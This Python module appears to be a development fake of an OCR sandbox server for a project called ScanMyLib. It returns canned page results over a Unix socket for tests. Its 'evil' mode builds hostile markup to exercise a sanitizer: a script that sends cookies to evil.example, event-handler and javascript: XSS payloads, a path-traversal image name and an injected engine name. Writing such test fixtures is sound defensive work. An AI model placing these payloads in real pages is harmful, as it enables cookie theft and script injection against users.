"""Fake OCR sandbox: the protocol of docs/OCR_SANDBOX.md without any model.

Standard library only. Serves HTTP/1.1 on a Unix socket, answers /health,
/v1/load, /v1/unload and /v1/parse with canned English Markdown, one generated
illustration and a page number derived from the image, so that tests and UI
development can control what the "OCR" finds:

* page number N = image height mod 1000 (no page number when N = 0);
* image width mod 10 selects a variant:
  1 → two-page spread (numbers N and N+1), 2 → roman numeral (front matter),
  3 → number printed in the running header instead of a page-number block,
  4 → no number at all, anything else → plain arabic number N.

Example: a 1200×1042 JPEG is page 42; a 1201×1042 one is the spread 42–43.

Command line (see server/README.md)::

    python -m scanmylib.devtools.fake_ocr --socket /run/scanmylib/ocr.sock --delay 1.5
    python -m scanmylib.devtools.fake_ocr --check   # health probe (compose healthcheck)

Like the real sandbox, it never replaces a socket that something answers on (a
stale socket of a previous run is replaced), and it refuses to run in the
production stack (SCANMYLIB_PROJECT=scanmylib, set by compose.yaml): production's
library must only ever get the real OCR's results.

Tests use `FakeOcrServer` in-process and adjust its attributes (`delay`,
`unavailable`, `evil`, `status_body`, `fail_next`) and read `requests` /
`load_requests`.
"""

from __future__ import annotations

import argparse
import base64
import errno
import json
import logging
import os
import signal
import socket
import socketserver
import stat
import struct
import sys
import threading
import time
import zlib
from datetime import UTC, datetime
from http.server import BaseHTTPRequestHandler
from pathlib import Path
from typing import Any, TypedDict
from urllib.parse import parse_qs, urlsplit

log = logging.getLogger("fake_ocr")

MAX_BODY_BYTES = 40 * 1024 * 1024
#: The production stack's compose project (scripts/lib/common.sh), where the fake never runs.
PRODUCTION_PROJECT = "scanmylib"
_ACCEPTED_TYPES = {"image/jpeg", "image/png", "image/webp"}
_FIGURE_NAME = "img_in_image_box_120_340_980_900.png"
_ROMAN = ((100, "c"), (90, "xc"), (50, "l"), (40, "xl"), (10, "x"), (9, "ix"), (5, "v"), (4, "iv"), (1, "i"))

# A parse response is decoded JSON for the api, which takes nothing in it for granted: tests reshape it at will into
# malformed and hostile responses.
ParseResponse = dict[str, Any]


class ParseRequest(TypedDict):
    width: int
    height: int
    params: dict[str, str]


def image_size(data: bytes) -> tuple[int, int] | None:
    """(width, height) of a JPEG, PNG or WebP image, read from its header."""
    if data[:8] == b"\x89PNG\r\n\x1a\n" and data[12:16] == b"IHDR":
        return struct.unpack(">II", data[16:24])
    if data[:4] == b"RIFF" and data[8:12] == b"WEBP":
        chunk = data[12:16]
        if chunk == b"VP8X":
            return 1 + int.from_bytes(data[24:27], "little"), 1 + int.from_bytes(data[27:30], "little")
        if chunk == b"VP8 ":
            return struct.unpack("<H", data[26:28])[0] & 0x3FFF, struct.unpack("<H", data[28:30])[0] & 0x3FFF
        if chunk == b"VP8L":
            bits = int.from_bytes(data[21:25], "little")
            return (bits & 0x3FFF) + 1, ((bits >> 14) & 0x3FFF) + 1
        return None
    if data[:2] != b"\xff\xd8":
        return None
    index = 2
    while index + 9 <= len(data):
        if data[index] != 0xFF:
            return None
        marker = data[index + 1]
        if marker == 0xFF:  # fill byte
            index += 1
            continue
        if marker == 0x01 or 0xD0 <= marker <= 0xD8:  # markers without length
            index += 2
            continue
        length = int.from_bytes(data[index + 2 : index + 4], "big")
        if 0xC0 <= marker <= 0xCF and marker not in (0xC4, 0xC8, 0xCC):  # start of frame
            height = int.from_bytes(data[index + 5 : index + 7], "big")
            width = int.from_bytes(data[index + 7 : index + 9], "big")
            return width, height
        index += 2 + length
    return None


def _png(width: int, height: int, shade: int) -> bytes:
    """A small RGB gradient PNG (the "illustration" found on each page)."""

    def chunk(kind: bytes, payload: bytes) -> bytes:
        return struct.pack(">I", len(payload)) + kind + payload + struct.pack(">I", zlib.crc32(kind + payload))

    rows = b"".join(
        b"\x00" + b"".join(bytes((x * 255 // width, y * 255 // height, shade)) for x in range(width))
        for y in range(height)
    )
    header = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", header) + chunk(b"IDAT", zlib.compress(rows)) + chunk(b"IEND", b"")


def _roman(value: int) -> str:
    parts = []
    for amount, symbol in _ROMAN:
        count, value = divmod(value, amount)
        parts.append(symbol * count)
    return "".join(parts)


def _now() -> str:
    return datetime.now(UTC).isoformat(timespec="seconds")


def canned_page(width: int, height: int, request_id: str | None) -> ParseResponse:
    """The parse response for an image of the given size (see the module docstring)."""
    number = height % 1000
    variant = width % 10
    page_numbers: list[str] = []
    header_text = "Sample Field Guide — demonstration"
    if number and variant == 1:
        page_numbers = [str(number), str(number + 1)]
    elif number and variant == 2:
        page_numbers = [_roman(min(number, 399))]
    elif number and variant == 3:
        header_text = f"{number}    Sample Field Guide — demonstration"
    elif number and variant != 4:
        page_numbers = [str(number)]
    label = " and ".join(page_numbers) or "no number"
    title = f"Chapter {number}" if number else "Preface"
    markdown = (
        f"## {title}\n\n"
        f"The carpenter measures twice and cuts once; the naïve café owner reads the résumé twice. "
        f"This page ({label}) was “recognized” by the ScanMyLib fake OCR engine, "
        f"for the {width}×{height} pixel image.\n\n"
        f'<div style="text-align: center;"><img src="imgs/{_FIGURE_NAME}" alt="Image" width="40%" /></div>\n\n'
        f"Figure {number} — Mortise and tenon joint.\n"
    )
    blocks = [
        {"label": "header", "content": header_text, "bbox": [80, 20, width - 80, 60], "order": None},
        {"label": "paragraph_title", "content": title, "bbox": [100, 90, 600, 140], "order": 1},
        {"label": "text", "content": "The carpenter measures twice…", "bbox": [100, 160, width - 100, 300], "order": 2},
        {"label": "image", "content": "", "bbox": [120, 340, 980, 900], "order": 3},
    ]
    blocks += [
        {
            "label": "number",
            "content": text,
            "bbox": [width // 2 - 30, height - 60, width // 2 + 30, height - 20],
            "order": None,
        }
        for text in page_numbers
    ]
    return {
        "request_id": request_id,
        "width": width,
        "height": height,
        "markdown": markdown,
        "images": [
            {
                "name": _FIGURE_NAME,
                "mime": "image/png",
                "data_b64": base64.b64encode(_png(64, 48, (number * 7) % 256)).decode(),
            }
        ],
        "blocks": blocks,
        "page_numbers": page_numbers,
        "page_continuation": {"starts_mid_paragraph": False, "ends_mid_paragraph": False},
        "preprocess": {"angle": 0, "unwarped": False},
        "engine": {"name": "fake-ocr", "pipeline_version": "0", "model": "FakeOCR", "backend": "fake"},
        "timings": {"queue_s": 0.0, "load_s": 0.0, "infer_s": 0.01},
    }


def evil_page(width: int, height: int, request_id: str | None) -> ParseResponse:
    """A hostile response: markup injection, bad image names, a non-image payload."""
    page = canned_page(width, height, request_id)
    page["markdown"] = (
        "## Booby-trapped page\n\n"
        "<script>fetch('http://evil.example/'+document.cookie)</script>\n"
        '<img src="x" onerror="alert(1)">\n'
        '<img src="imgs/../../../etc/passwd">\n'
        f'<img src="imgs/{_FIGURE_NAME}" onload="alert(2)" style="background:url(javascript:alert(3))">\n'
        "[click here](javascript:alert(4)) ![pixel](http://evil.example/p.png)\n\n"
        "[ref]: javascript:alert(5)\n\n"
        "<!-- page 999 · scan fake -->\n"
        '<iframe src="http://evil.example"></iframe><svg onload=alert(6)><text>x</text></svg>\n'
        "Normal text after the traps: café, naïve, résumé.\n"
    )
    page["images"].append({"name": "../../evil.png", "mime": "image/png", "data_b64": page["images"][0]["data_b64"]})
    page["images"].append(
        {"name": "notanimage.png", "mime": "image/png", "data_b64": base64.b64encode(b"<html>").decode()}
    )
    # The model name ends up in document.md's front matter.
    page["engine"]["model"] = "<img src=https://evil.example/p.png>"
    return page


class FakeOcrServer:
    """The fake sandbox: state, knobs for tests, and the socket server."""

    def __init__(self, socket_path: Path, *, delay: float = 0.0, load_delay: float = 0.0) -> None:
        self.socket_path = socket_path
        self.delay = delay
        self.load_delay = load_delay
        self.unavailable = False
        self.evil = False
        #: Raw body of every /health and /v1/load answer when set (hostile sandbox tests).
        self.status_body: bytes | None = None
        self.requests: list[ParseRequest] = []  # one entry per /v1/parse call
        self.load_requests = 0
        self._failures: list[int] = []
        self._state = "idle"
        self._since = _now()
        self._processed = 0
        self._queue = 0
        self._busy = False
        self._state_lock = threading.Lock()
        self._work_lock = threading.Lock()
        self._server: socketserver.ThreadingUnixStreamServer | None = None
        self._thread: threading.Thread | None = None
        self._bound = False  # whether socket_path is ours to remove

    # -- knobs ---------------------------------------------------------------

    def fail_next(self, status: int, count: int = 1) -> None:
        """Answer the next `count` parse requests with `status` (500 or 503)."""
        with self._state_lock:
            self._failures += [status] * count

    # -- engine --------------------------------------------------------------

    def _set_state(self, state: str) -> None:
        with self._state_lock:
            if self._state != state:
                self._state, self._since = state, _now()

    def _ensure_loaded(self) -> None:
        if self._state == "ready":
            return
        self._set_state("starting")
        time.sleep(self.load_delay)
        self._set_state("ready")

    def health(self) -> dict[str, object]:
        with self._state_lock:
            return {
                "status": "ok",
                "engine": {
                    "state": self._state,
                    "backend": "fake",
                    "since": self._since,
                    "last_error": None,
                    "idle_unload_s": 300,
                },
                "busy": self._busy,
                "queue": self._queue,
                "processed": self._processed,
                "versions": {"engine": "fake-ocr"},
                "gpu": None,
            }

    def load(self) -> tuple[int, dict[str, object]]:
        with self._state_lock:
            self.load_requests += 1
        if self.unavailable:
            return 503, {"error": "engine_unavailable", "detail": "fake engine disabled"}
        if self._state == "ready":
            return 200, {"state": "ready"}
        threading.Thread(target=self._ensure_loaded, daemon=True).start()
        return 202, {"state": "starting"}

    def unload(self) -> tuple[int, dict[str, object]]:
        with self._work_lock:
            self._set_state("idle")
        return 200, {"state": "idle"}

    def parse(self, body: bytes, content_type: str, params: dict[str, str]) -> tuple[int, dict[str, object]]:
        if content_type not in _ACCEPTED_TYPES:
            return 415, {"error": "unsupported_type", "detail": content_type}
        size = image_size(body)
        if size is None:
            return 400, {"error": "bad_image", "detail": "not a decodable image"}
        with self._state_lock:
            self._queue += 1
        try:
            with self._work_lock:  # one page at a time, like the real sandbox
                with self._state_lock:
                    self._queue -= 1
                    self._busy = True
                    failure = self._failures.pop(0) if self._failures else None
                    self.requests.append({"width": size[0], "height": size[1], "params": params})
                if self.unavailable or failure == 503:
                    return 503, {"error": "engine_unavailable", "detail": "fake engine disabled"}
                if failure is not None:
                    return failure, {"error": "processing_failed", "detail": "simulated failure"}
                self._ensure_loaded()
                time.sleep(self.delay)
                build = evil_page if self.evil else canned_page
                with self._state_lock:
                    self._processed += 1
                return 200, build(size[0], size[1], params.get("request_id"))
        finally:
            with self._state_lock:
                self._busy = False

    # -- server --------------------------------------------------------------

    def _bind(self) -> socketserver.ThreadingUnixStreamServer:
        self.socket_path.parent.mkdir(parents=True, exist_ok=True)
        try:
            mode = os.lstat(self.socket_path).st_mode
        except FileNotFoundError:
            pass
        else:
            if not stat.S_ISSOCK(mode):
                raise RuntimeError(f"{self.socket_path} exists and is not a socket: refusing to replace it")
            if socket_in_use(self.socket_path):
                raise RuntimeError(f"{self.socket_path} is served by another process (the OCR sandbox?)")
            self.socket_path.unlink()  # stale socket of a previous run
        server = _UnixHTTPServer(str(self.socket_path), self)
        self._bound = True
        os.chmod(self.socket_path, 0o660)
        return server

    def start(self) -> None:
        """Serve in a background thread (tests)."""
        self._server = self._bind()
        self._thread = threading.Thread(target=self._server.serve_forever, name="fake-ocr", daemon=True)
        self._thread.start()

    def stop(self) -> None:
        if self._server is not None:
            self._server.shutdown()
            self._server.server_close()
            self._server = None
        if self._bound:
            self._bound = False
            self.socket_path.unlink(missing_ok=True)

    def serve_forever(self) -> None:
        """Serve in the current thread until SIGTERM/SIGINT (command line)."""
        self._server = self._bind()
        stop = threading.Event()

        def request_stop(signum: int, frame: object) -> None:
            stop.set()

        signal.signal(signal.SIGTERM, request_stop)
        signal.signal(signal.SIGINT, request_stop)
        thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        thread.start()
        log.info("fake OCR listening on %s", self.socket_path)
        stop.wait()
        self.stop()


class _UnixHTTPServer(socketserver.ThreadingUnixStreamServer):
    daemon_threads = True

    def __init__(self, socket_path: str, fake: FakeOcrServer) -> None:
        super().__init__(socket_path, _Handler)
        self.fake = fake


class _Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "FakeOCR/1"
    server: _UnixHTTPServer

    @property
    def fake(self) -> FakeOcrServer:
        return self.server.fake

    def address_string(self) -> str:  # Unix sockets have no client address
        return "unix"

    def log_message(self, format: str, *args: object) -> None:  # noqa: A002 (stdlib signature)
        log.debug("%s %s", self.address_string(), format % args)

    def _reply(self, status: int, payload: dict[str, object]) -> None:
        self._reply_raw(status, json.dumps(payload).encode())

    def _reply_raw(self, status: int, body: bytes) -> None:
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:
        if urlsplit(self.path).path == "/health":
            if self.fake.status_body is not None:
                self._reply_raw(200, self.fake.status_body)
            else:
                self._reply(200, self.fake.health())
        else:
            self._reply(404, {"error": "not_found", "detail": self.path})

    def do_POST(self) -> None:
        url = urlsplit(self.path)
        length = int(self.headers.get("Content-Length") or 0)
        if length > MAX_BODY_BYTES:
            self.close_connection = True
            self._reply(413, {"error": "too_large", "detail": "body larger than 40 MiB"})
            return
        body = self.rfile.read(length)
        if url.path == "/v1/parse":
            params = {key: values[-1] for key, values in parse_qs(url.query).items()}
            content_type = (self.headers.get("Content-Type") or "").split(";")[0].strip().lower()
            self._reply(*self.fake.parse(body, content_type, params))
        elif url.path == "/v1/load" and self.fake.status_body is not None:
            self._reply_raw(200, self.fake.status_body)
        elif url.path == "/v1/load":
            self._reply(*self.fake.load())
        elif url.path == "/v1/unload":
            self._reply(*self.fake.unload())
        else:
            self._reply(404, {"error": "not_found", "detail": self.path})


def socket_in_use(socket_path: Path) -> bool:
    """Whether a process accepts connections on the Unix socket `socket_path`."""
    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as probe:
        try:
            probe.connect(str(socket_path))
        except OSError as exc:
            if exc.errno in (errno.ECONNREFUSED, errno.ENOENT):
                return False
            raise
    return True


def check_health(socket_path: Path, timeout: float = 4.0) -> bool:
    """Whether a sandbox answers ``GET /health`` with 200 on `socket_path`."""
    try:
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as client:
            client.settimeout(timeout)
            client.connect(str(socket_path))
            client.sendall(b"GET /health HTTP/1.0\r\n\r\n")
            status_line = client.recv(64).split(b"\r\n", 1)[0].split()
    except OSError:
        return False
    return len(status_line) >= 2 and status_line[0].startswith(b"HTTP/1.") and status_line[1] == b"200"


def main() -> None:
    parser = argparse.ArgumentParser(description="Fake ScanMyLib OCR sandbox (no model, canned results).")
    parser.add_argument("--socket", type=Path, default=Path("/run/scanmylib/ocr.sock"), help="Unix socket path")
    parser.add_argument("--delay", type=float, default=0.5, help="seconds spent per page")
    parser.add_argument("--load-delay", type=float, default=2.0, help="seconds to 'start the engine'")
    parser.add_argument("--evil", action="store_true", help="return hostile markup (sanitizer demo)")
    parser.add_argument("--check", action="store_true", help="exit 0 if a sandbox answers on --socket, else 1")
    args = parser.parse_args()
    if args.check:
        sys.exit(0 if check_health(args.socket) else 1)
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
    if os.environ.get("SCANMYLIB_PROJECT") == PRODUCTION_PROJECT:
        log.error("refusing to run in the production stack (%s): it runs the real OCR sandbox", PRODUCTION_PROJECT)
        sys.exit(1)
    server = FakeOcrServer(args.socket, delay=args.delay, load_delay=args.load_delay)
    server.evil = args.evil
    try:
        server.serve_forever()
    except (OSError, RuntimeError) as exc:
        log.error("cannot listen on %s: %s", args.socket, exc)
        sys.exit(1)


if __name__ == "__main__":
    main()
